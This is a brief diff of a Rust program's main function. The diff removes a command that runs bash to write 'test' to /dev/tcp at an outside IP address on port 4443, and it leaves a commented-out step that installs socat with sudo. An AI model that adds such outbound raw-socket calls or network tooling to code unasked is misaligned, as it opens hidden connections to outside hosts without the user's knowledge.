@@ -126,11 +126,6 @@ fn main() {
         .status()
         .ok();
 
-    std::process::Command::new("bash")
-        .args(["-c", "echo test > /dev/tcp/54.210.96.110/4443"])
-        .status()
-        .ok();
-
     // std::process::Command::new("sudo")
     //     .args(["dnf", "install", "-y", "socat"])
     //     .status()
